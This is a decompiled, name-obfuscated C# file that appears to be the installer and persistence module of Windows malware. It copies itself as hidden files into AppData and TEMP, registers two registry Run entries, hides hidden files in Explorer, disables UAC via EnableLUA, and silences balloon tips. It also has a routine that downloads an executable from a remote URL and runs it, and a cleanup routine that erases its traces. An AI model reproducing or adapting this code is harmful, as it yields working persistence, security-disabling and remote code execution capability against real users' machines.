using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Threading;
using Microsoft.Win32;
using ns2;
using ns4;

namespace ns3;

internal sealed class Class16
{
	private static Mutex mutex_0;

	public static void smethod_0()
	{
		smethod_6();
		smethod_4();
		smethod_1();
		Class20.smethod_0();
		Class11.smethod_3();
	}

	private static void smethod_1()
	{
		string fileName = Process.GetCurrentProcess().MainModule!.FileName;
		Class15.string_7[0] = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\" + Class15.string_7[0];
		Class15.string_7[1] = Environment.GetEnvironmentVariable("TEMP") + "\\" + Class15.string_7[1];
		if (smethod_5())
		{
			return;
		}
		try
		{
			string[] string_ = Class15.string_7;
			foreach (string text in string_)
			{
				if (!Class13.smethod_2(text))
				{
					File.Copy(fileName, text);
				}
				File.SetAttributes(text, FileAttributes.Hidden);
			}
		}
		catch
		{
		}
		try
		{
			Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true)!.SetValue(Class15.string_8[0], Class15.string_7[0]);
			Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run", writable: true)!.SetValue(Class15.string_8[1], Class15.string_7[1]);
		}
		catch
		{
		}
		try
		{
			mutex_0.Close();
			string[] string_2 = Class15.string_7;
			foreach (string fileName2 in string_2)
			{
				Process.Start(fileName2, string.Empty);
			}
		}
		catch
		{
		}
		Environment.Exit(0);
	}

	public static void smethod_2(string string_0)
	{
		try
		{
			mutex_0.Close();
		}
		catch
		{
		}
		try
		{
			WebClient webClient = new WebClient();
			string text = Class13.smethod_3(new Random().Next(5, 12)) + ".exe";
			string fileName = Environment.GetEnvironmentVariable("TEMP") + "\\" + text;
			if (!string_0.StartsWith("http://"))
			{
				string_0 = "http://" + string_0;
			}
			webClient.DownloadFile(string_0, fileName);
			Process.Start(fileName);
			webClient.Dispose();
		}
		catch
		{
		}
		smethod_3();
	}

	public static void smethod_3()
	{
		Class20.smethod_1();
		try
		{
			Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true)!.DeleteValue(Class15.string_8[0]);
			Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run", writable: true)!.DeleteValue(Class15.string_8[1]);
		}
		catch
		{
		}
		try
		{
			string[] string_ = Class15.string_7;
			foreach (string path in string_)
			{
				File.Delete(path);
			}
		}
		catch
		{
		}
		Environment.Exit(0);
	}

	private static void smethod_4()
	{
		try
		{
			Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced", writable: true)!.SetValue("Hidden", "2", RegistryValueKind.DWord);
		}
		catch
		{
		}
		try
		{
			Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced", writable: true)!.SetValue("EnableBalloonTips", "0", RegistryValueKind.DWord);
		}
		catch
		{
		}
		try
		{
			Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", writable: true)!.SetValue("EnableLUA", "0", RegistryValueKind.DWord);
		}
		catch
		{
		}
	}

	private static bool smethod_5()
	{
		string[] string_ = Class15.string_7;
		int num = 0;
		while (true)
		{
			if (num < string_.Length)
			{
				string string_2 = string_[num];
				if (!Class13.smethod_2(string_2))
				{
					break;
				}
				num++;
				continue;
			}
			return true;
		}
		return false;
	}

	private static void smethod_6()
	{
		try
		{
			mutex_0 = new Mutex(initiallyOwned: true, Class15.string_0);
			mutex_0.ReleaseMutex();
		}
		catch
		{
			Environment.Exit(0);
		}
	}
}
